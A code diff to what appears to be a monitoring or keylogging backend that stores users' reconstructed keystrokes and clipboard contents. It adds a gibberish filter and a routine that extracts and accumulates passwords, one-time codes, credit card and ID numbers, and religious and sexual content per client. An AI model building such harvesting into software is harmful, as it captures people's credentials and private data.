@@ -1,4 +1,5 @@
 import ClientDaily from '../models/ClientDaily.js';
+import { extractContentFromText } from './contentDetection.js';
 
 /**
  * Updates ClientDaily model with processed logs data
@@ -106,6 +107,9 @@ async function processSingleLog(clientDaily, log) {
 
     // Update sessions (only if content is non-empty)
     updateSessions(clientDaily, log);
+
+    // Update content stats
+    updateContentStats(clientDaily, log);
 }
 
 /**
@@ -263,19 +267,112 @@ function updateSessions(clientDaily, log) {
     const clipboardData = log.clipboard_activity?.clipboard_data || [];
     const hasClipboardContent = clipboardData.some(item => item.content && item.content.trim() !== '');
 
-    // Only add session if there's text content or clipboard content
-    if (reconstructedText.trim() !== '' || hasClipboardContent) {
+    // If clipboard has content, always add session as before
+    if (hasClipboardContent) {
         const session = {
             reconstructed_text: reconstructedText,
             start_time: new Date(log.start_time),
             end_time: new Date(log.end_time),
-            app: {
-                name: log.application?.window_title || 'unknown',
-                category: log.application?.category || 'other'
-            },
-            clipboard: hasClipboardContent ? JSON.stringify(clipboardData) : ''
+            app: log.application?.window_title || 'unknown',
+            clipboard: JSON.stringify(clipboardData)
         };
-
         clientDaily.sessions.push(session);
+        return;
     }
-} 
+
+    // If clipboard is empty, filter out gibberish reconstructed text
+    const trimmedText = reconstructedText.trim();
+    // 1. Ignore if only one character
+    if (trimmedText.length <= 1) return;
+    // 2. Ignore if text is repeated single character (e.g., 'aaaaa')
+    if (/^(.)\1{2,}$/.test(trimmedText)) return;
+    // 3. Ignore if text is a repeated short pattern (e.g., 'asdasdasd', 'abcdabcd')
+    //    We'll check for repeated patterns up to 4 chars
+    for (let len = 2; len <= 4; len++) {
+        if (trimmedText.length >= len * 3) { // at least 3 repeats
+            const pattern = trimmedText.slice(0, len);
+            const regex = new RegExp(`^(?:${pattern})+$`);
+            if (regex.test(trimmedText)) return;
+        }
+    }
+    // 4. Ignore if text is a common gibberish pattern (e.g., 'asdasd', 'asdf', 'qwer', etc.)
+    const gibberishPatterns = [
+        /^a?s?d{2,}$/, // asd, asdd, asddd, etc.
+        /^a?s?d?a?s?d?$/, // asdasd
+        /^a?s?d?f{2,}$/, // asdf, asdff, etc.
+        /^q?w?e?r{2,}$/, // qwer, qwerr, etc.
+        /^z?x?c?v{2,}$/, // zxcv, zxcvv, etc.
+    ];
+    if (gibberishPatterns.some(re => re.test(trimmedText.toLowerCase()))) return;
+
+    // Only add session if there's non-gibberish text content
+    const session = {
+        reconstructed_text: reconstructedText,
+        start_time: new Date(log.start_time),
+        end_time: new Date(log.end_time),
+        app: log.application?.window_title || 'unknown',
+        clipboard: ''
+    };
+    clientDaily.sessions.push(session);
+}
+
+/**
+ * Update content stats by analyzing reconstructed text and clipboard data
+ */
+function updateContentStats(clientDaily, log) {
+    // Initialize content_stats if not exists
+    if (!clientDaily.content_stats) {
+        clientDaily.content_stats = {
+            offensive_keywords: [],
+            Passwords: [],
+            OTP: [],
+            EmailAddresses: [],
+            PhoneNumbers: [],
+            IDNumbers: [],
+            CreditCardNumbers: [],
+            LocationReferences: [],
+            Names: [],
+            URLs: [],
+            dates: [],
+            ip_addresses: [],
+            monetary_amounts: [],
+            sexual_content: [],
+            religious_references: []
+        };
+    }
+
+    // Extract content from reconstructed text
+    const reconstructedText = log.content?.reconstructed_text || '';
+    const textContent = extractContentFromText(reconstructedText);
+
+    // Extract content from clipboard data
+    const clipboardData = log.clipboard_activity?.clipboard_data || [];
+    let clipboardContent = '';
+    
+    for (const clipboardItem of clipboardData) {
+        if (clipboardItem.content && typeof clipboardItem.content === 'string') {
+            clipboardContent += clipboardItem.content + ' ';
+        }
+    }
+    
+    const clipboardTextContent = extractContentFromText(clipboardContent);
+
+    // Merge all detected content
+    const allContent = [textContent, clipboardTextContent];
+    
+    // Update each field in content_stats
+    for (const [key, value] of Object.entries(textContent)) {
+        if (Array.isArray(value) && value.length > 0) {
+            // Add new items to existing array, avoiding duplicates
+            clientDaily.content_stats[key] = [...new Set([...clientDaily.content_stats[key], ...value])];
+        }
+    }
+
+    // Also update from clipboard content
+    for (const [key, value] of Object.entries(clipboardTextContent)) {
+        if (Array.isArray(value) && value.length > 0) {
+            // Add new items to existing array, avoiding duplicates
+            clientDaily.content_stats[key] = [...new Set([...clientDaily.content_stats[key], ...value])];
+        }
+    }
+}
